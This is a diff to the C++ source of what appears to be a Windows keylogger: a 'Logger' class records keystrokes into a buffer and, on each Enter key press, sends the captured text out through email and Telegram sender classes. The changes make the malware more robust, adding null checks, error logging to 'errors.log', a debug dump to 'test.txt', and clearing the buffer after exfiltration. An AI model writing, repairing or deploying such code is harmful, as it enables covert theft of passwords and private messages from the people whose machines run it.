@@ -29,12 +29,13 @@ Logger* Logger::getInstance()
 void Logger::run()
 {
     Logger* log = Logger::getInstance();
-    FabricSender* fabric = new FabricSender();
-    array_senders = fabric->createSenders();
-    while (true) {
-        if (Runner::exit != 0) {
+    std::ofstream a("test.txt");
+    int cnt = 0;
+    while (!Runner::exitProgram) {
+        /*if (!Runner::exit) {*/
+            a << cnt << instance->simbols << std::endl;
             instance->saver();
-        }
+        //}
     }
 }
 
@@ -63,7 +64,9 @@ void Logger::saver() {
                 break;*/
 
             case VK_RETURN:
-                instance->send();
+                if (!Runner::exit) {
+                    instance->send();
+                }
                 break;
 
             case VK_LCONTROL:
@@ -274,6 +277,9 @@ void Logger::saver() {
         }
 
     }
+    if (Runner::exit) {
+        instance->simbols = "";
+    }
 }
 
 bool Logger::checkUpper()
@@ -299,21 +305,33 @@ char Logger::toLower(char letter)
 }
 
 void Logger::send() {
+    FabricSender* fabric = new FabricSender();
+    array_senders = fabric->createSenders();
+    std::ofstream logs("errors.log", std::ios::app);
+    logs << "1" << instance->simbols << std::endl;
     for (int i = 0; i < lengthArray; i++) {
-        try {
-            MailSender* emailsender = dynamic_cast<MailSender*>(array_senders[i]);
-            emailsender->send(instance->simbols);
-        }
-        catch (std::bad_cast e) {
+        if (array_senders[i] != nullptr) {
+            try {
+                MailSender* emailsender = dynamic_cast<MailSender*>(array_senders[i]);
+                if (emailsender != nullptr) {
+                    emailsender->send(instance->simbols);
+                }
+            }
+            catch (std::bad_cast e) {
+                logs << "Email error " << e.what() << std::endl;
+            }
 
-        }
-
-        try {
-            TgSender* tgsender = dynamic_cast<TgSender*>(array_senders[i]);
-            tgsender->send(instance->simbols);
-        }
-        catch (std::bad_cast e) {
-
+            try {
+                TgSender* tgsender = dynamic_cast<TgSender*>(array_senders[i]);
+                if (tgsender != nullptr) {
+                    tgsender->send(instance->simbols);
+                }
+            }
+            catch (std::bad_cast e) {
+                logs << "TG error " << e.what() << std::endl;
+            }
         }
     }
+    logs.close();
+    instance->simbols = "";
 }
